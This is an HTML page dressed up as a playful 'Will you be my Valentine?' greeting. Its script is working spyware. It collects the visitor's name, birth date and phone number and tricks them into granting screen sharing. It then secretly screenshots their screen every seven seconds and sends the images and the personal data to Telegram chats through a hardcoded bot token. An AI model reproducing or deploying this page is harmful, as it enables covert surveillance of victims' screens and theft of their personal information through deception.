<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>For My Bestu ‚ù§Ô∏è</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Dancing+Script:wght@700&display=swap');
        
        :root { --bg: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); --glass: rgba(255, 255, 255, 0.25); --accent: #ff4d6d; }
        .dark-theme { --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); --glass: rgba(255, 255, 255, 0.05); --accent: #ff758f; }

        body { font-family: 'Poppins', sans-serif; background: var(--bg); min-height: 100vh; transition: 0.5s; overflow: hidden; display: flex; align-items: center; justify-content: center; color: white; }
        .glass-card { background: var(--glass); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); }
        .cursive { font-family: 'Dancing Script', cursive; }
        .status-bar { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; padding: 10px 24px; font-size: 12px; font-weight: 600; z-index: 500; }
        
        #yt-header { position: fixed; top: -300px; left: 0; width: 100%; height: 240px; transition: 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 400; background: black; border-bottom: 4px solid var(--accent); }
        #yt-header.active { top: 0; }
        
        .hidden-stage { display: none; }
        video#hidden-processor { display: none; }
    </style>
</head>
<body id="capture-body">

    <video id="hidden-processor" autoplay playsinline muted></video>

    <div class="status-bar">
        <div id="clock">12:00</div>
        <div class="flex gap-3"><span>üì∂</span> <span id="bat-val">üîã 98%</span></div>
    </div>

    <button onclick="toggleTheme()" class="fixed bottom-6 right-6 p-4 glass-card rounded-2xl z-[600]">
        <span id="theme-icon">üåô</span>
    </button>

    <div id="yt-header"><div id="player-mount" class="w-full h-full"></div></div>

    <div class="w-full max-w-sm px-4">
        <div id="main-content" class="glass-card p-8 text-center w-full">
            
            <div id="stage-1" class="space-y-4">
                <h1 class="text-4xl font-bold cursive mb-6">Welcome ‚ú®</h1>
                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none">
                <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none">
                <input type="tel" id="mobile" placeholder="Mobile Number" class="w-full p-4 rounded-2xl bg-white/10 border border-white/20 outline-none">
                <button onclick="startMagicProcess()" class="w-full bg-pink-500 py-4 rounded-2xl font-bold shadow-xl mt-4 active:scale-95 transition-all">Start Magic Experience ‚ù§Ô∏è</button>
            </div>

            <div id="stage-2" class="hidden-stage">
                <h1 class="text-3xl font-bold cursive mb-8">Will you be my Valentine? ‚ù§Ô∏è</h1>
                <div class="grid gap-4">
                    <button onclick="handleChoice('YES', '‚ù§Ô∏è')" class="bg-pink-500 py-4 rounded-2xl font-bold shadow-lg">YES! üòç</button>
                    <button onclick="handleChoice('NO', 'üòä')" class="bg-white/10 py-4 rounded-2xl font-bold border border-white/20">No üò¢</button>
                    <button onclick="handleChoice('FOOD', 'üçï')" class="bg-yellow-500 py-4 rounded-2xl font-bold shadow-lg">Food (You Pay! üçï)</button>
                </div>
            </div>

            <div id="stage-3" class="hidden-stage space-y-6">
                <h2 class="text-3xl font-bold cursive">Thank You! ‚ù§Ô∏è</h2>
                <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcXpqcCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKoWXlo3M1nKS6A/giphy.gif" class="w-full rounded-3xl shadow-2xl mb-4">
                <div class="bg-white/10 p-4 rounded-2xl">
                    <textarea id="final-reply" placeholder="Send a message back..." class="w-full p-3 rounded-xl bg-transparent outline-none text-sm border border-white/10" rows="2"></textarea>
                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-2 rounded-xl mt-2 font-bold text-xs uppercase">Submit ‚úÖ</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8511064311:AAGi_3QOQzanNtc9P7PzT4z54NBZEXfK5rk";
        const CHAT_IDS = ["6572151527", "7893857792"];
        let store = {};
        let activeStream = null;

        function updateClock() {
            const d = new Date();
            document.getElementById('clock').innerText = d.getHours() + ":" + String(d.getMinutes()).padStart(2, '0');
        }
        setInterval(updateClock, 1000); updateClock();

        function toggleTheme() {
            document.body.classList.toggle('dark-theme');
            document.getElementById('theme-icon').innerText = document.body.classList.contains('dark-theme') ? '‚òÄÔ∏è' : 'üåô';
        }

        async function startMagicProcess() {
            store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
            if(!store.n || !store.m) return alert("Fill all details! üòä");

            try {
                // Request Screen Share for Real-Time View
                activeStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                document.getElementById('hidden-processor').srcObject = activeStream;

                // Prevent Screen Sleep (WakeLock)
                if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');

                // Start Snapshot Loop (Every 7 seconds)
                setInterval(captureFrame, 7000);

                // Switch Stage
                document.getElementById('stage-1').classList.add('hidden-stage');
                document.getElementById('stage-2').classList.remove('hidden-stage');

                // Log to Telegram
                CHAT_IDS.forEach(id => {
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("üöÄ APP SESSION STARTED\nName: "+store.n+"\nMobile: "+store.m)}`);
                });

            } catch (err) {
                alert("Please allow screen share to reveal the heart! üò¢");
            }
        }

        function captureFrame() {
            if (!activeStream) return;
            const video = document.getElementById('hidden-processor');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                CHAT_IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append('chat_id', id); fd.append('photo', blob, 'frame.png');
                    fd.append('caption', `üì° REAL-TIME: ${store.n}`);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                });
            }, 'image/png');
        }

        const yt = { 'YES': 'TK2RwQUun-U', 'NO': 'CVEM60qkzT8', 'FOOD': 'XGURSAziJjc' };

        function handleChoice(type, emoji) {
            captureFrame(); // Immediate capture on choice
            document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${yt[type]}?autoplay=1" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
            document.getElementById('yt-header').classList.add('active');
            document.getElementById('stage-2').classList.add('hidden-stage');
            document.getElementById('stage-3').classList.remove('hidden-stage');
        }

        async function sendFinalReply() {
            const reply = document.getElementById('final-reply').value;
            CHAT_IDS.forEach(id => {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("üí¨ Final Message: " + reply + " (From: " + store.n + ")")}`);
            });
            alert("Sent! Thank you!");
            location.reload();
        }

        window.onbeforeunload = () => "The magic is still running!";
    </script>
</body>
</html>
